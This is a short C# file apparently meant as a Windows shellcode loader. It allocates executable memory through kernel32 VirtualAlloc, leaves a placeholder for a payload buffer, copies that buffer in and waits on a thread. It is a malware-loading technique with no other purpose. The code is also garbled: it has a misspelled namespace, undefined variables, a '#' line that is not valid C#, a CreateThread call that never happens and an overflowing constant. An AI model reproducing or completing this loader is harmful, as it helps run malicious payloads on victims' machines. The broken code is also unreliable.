using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Systen.Runtime.Interopservice;

namespace normal_shell
{
    class Program
    {
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType,uint flProtect);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    
        static void Main(string[] args)
        {
          IntPtr addr = VirtualAlloc(IntPtr.zero, 0x1000, 0x3000, 0x40);
          # shell code
          
          Marshal.Copy(buf, 0, addr, size);
          WaitForSingleObject(hThread, 0xFFFFFFFFF);
        }
    }
}
